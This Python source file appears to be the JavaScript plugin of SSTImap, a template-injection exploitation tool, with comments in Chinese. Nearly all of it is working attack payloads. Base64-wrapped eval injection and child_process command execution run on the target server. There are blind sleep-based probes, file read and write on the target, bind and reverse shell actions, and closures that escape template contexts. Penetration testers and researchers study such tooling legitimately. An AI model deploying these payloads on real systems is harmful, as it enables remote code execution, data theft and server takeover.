from core import bash
from utils import closures
from core.plugin import Plugin
from utils import rand


class Javascript(Plugin):
    header_type = "add"
    priority = 8
    plugin_info = {
        "Description": 'JavaScript 中的 Eval 注入。基于 JavaScript 的模板引擎的基础',
        "Authors": [
            "Emilio @epinna https://github.com/epinna",  # 原始Tplmap插件
            "Vladislav Korchagin @vladko312 https://github.com/vladko312",  # SSTImap 更新
        ],
    }

    def language_init(self):
        self.update_actions({
            'render': {
                'call': 'inject',
                'render': """{code}""",
                'header': """({header[0]}+{header[1]}).toString()+""",
                'trailer': """+({trailer[0]}+{trailer[1]}).toString()""",
                'test_render': f'typeof({rand.randints[0]})+{rand.randints[1]}',
                'test_render_expected': f'number{rand.randints[1]}'
            },
            'render_error': {
                'call': 'inject',
                'render': """{code}""",
                'header': """''['x'][({header[0]}+{header[1]}).toString()+""",
                'trailer': """+({trailer[0]}+{trailer[1]}).toString()]""",
                'test_render': f'typeof({rand.randints[0]})+{rand.randints[1]}',
                'test_render_expected': f'number{rand.randints[1]}'
            },
            'boolean': {
                'call': 'evaluate_blind',
                'test_bool_true':  'typeof(1) + 2 == "number2"',
                'test_bool_false': 'typeof(2) + 1 == "number2"',
                'verify_bool_true':  'parseInt("5x") == 5 ',
                'verify_bool_false': 'parseInt("x5") == 5 '
            },
            'blind': {
                'call': 'execute_blind',
                'test_bool_true': 'true',
                'test_bool_false': 'false'
            },
            'evaluate': {
                'call': 'render',
                'evaluate': """eval(Buffer('{code_b64p}', 'base64').toString())""",
                'test_os': """require('os').platform()""",
                'test_os_expected': r'^[\w-]+$',
                'test_eval': '"executed".replace("xecu", "valua")',
                'test_eval_expected': 'evaluated'
            },
            'evaluate_boolean': {
                'call': 'inject',
                'evaluate_blind': """[""][0+!eval(Buffer('{code_b64p}', 'base64').toString())]["length"]"""
            },
            'evaluate_blind': {
                'call': 'inject',
                'evaluate_blind': """eval(Buffer('{code_b64p}', 'base64').toString())&&require('child_process').execSync('sleep {delay}')"""
            },
            'execute': {
                'call': 'render',
                'execute': """require('child_process').execSync(Buffer('{code_b64p}', 'base64').toString())""",
                'test_cmd': bash.os_print.format(s1=rand.randstrings[2]),
                'test_cmd_expected': rand.randstrings[2] 
            },
            'execute_boolean': {
                'call': 'evaluate_blind',
                # spawnSync() shell 选项已在 Node 5.7 中引入，因此这不适用于旧的 Node 版本。
                # TODO：使用另一个函数。
                'execute_blind': """require('child_process').spawnSync(Buffer('{code_b64p}', 'base64').toString(), options={{shell:true}}).status===0"""
            },
            # 此处不使用执行，因为它已渲染并且需要设置标题和预告片
            'execute_blind': {
                'call': 'inject',
                # execSync() 已在 Node 0.11 中引入，因此这不适用于旧的 Node 版本。
                # TODO：使用另一个函数。
                'execute_blind': """require('child_process').execSync(Buffer('{code_b64p}', 'base64').toString() + ' && sleep {delay}')"""
            },
            'bind_shell': {
                'call': 'execute_blind',
                'bind_shell': bash.bind_shell
            },
            'reverse_shell': {
                'call': 'execute_blind',
                'reverse_shell': bash.reverse_shell
            },
            # 这里没有evaluate_blind，因为我们没有睡眠，所以我们将使用inject
            'write': {
                'call': 'inject',
                'write': """require('fs').appendFileSync('{path}', Buffer('{chunk_b64p}', 'base64'), 'binary')//""",
                'truncate': """require('fs').writeFileSync('{path}', '')"""
            },
            'read': {
                'call': 'render',
                'read': """require('fs').readFileSync('{path}').toString('base64')"""
            },
            'md5': {
                'call': 'render',
                'md5': "require('crypto').createHash('md5').update(require('fs').readFileSync('{path}')).digest('hex')"
            },
            'md5_blind': {
                'call': 'evaluate_blind',
                'md5_blind': "require('crypto').createHash('md5').update(require('fs').readFileSync('{path}')).digest('hex')=='{md5}'",
                'exists_blind': "require('fs').existsSync('{path}')"
            },
        })

        self.set_contexts([
            # 文本上下文，无闭包
            {'level': 0},
            # 添加为字符串
            {'level': 1, 'prefix': '{closure}+', 'suffix': '+{rclosure}', 'closures': ctx_closures},
            # 这将用 ; 终止该语句。
            {'level': 1, 'prefix': '{closure};', 'suffix': '//', 'closures': ctx_closures},
            # 这不需要终止，例如如果（%s）{}
            {'level': 2, 'prefix': '{closure}', 'suffix': '//', 'closures': ctx_closures},
            # 评论区
            {'level': 5, 'prefix': '*/', 'suffix': '/*'},
        ])

    language = 'javascript'


ctx_closures = {
        1: [
            closures.close_single_double_quotes + closures.integer,
            closures.close_function + closures.empty
        ],
        2: [
            closures.close_single_double_quotes + closures.integer + closures.string + closures.var,
            closures.close_function + closures.empty
        ],
        3: [
            closures.close_single_double_quotes + closures.integer + closures.string + closures.var,
            closures.close_function + closures.close_list + closures.close_dict + closures.empty
        ],
        4: [
            closures.close_single_double_quotes + closures.integer + closures.string + closures.var,
            closures.close_function + closures.close_list + closures.close_dict + closures.empty
        ],
        5: [
            closures.close_single_double_quotes + closures.integer + closures.string + closures.var,
            closures.close_function + closures.close_list + closures.close_dict + closures.empty,
            closures.close_function + closures.close_list + closures.empty,
        ],
}

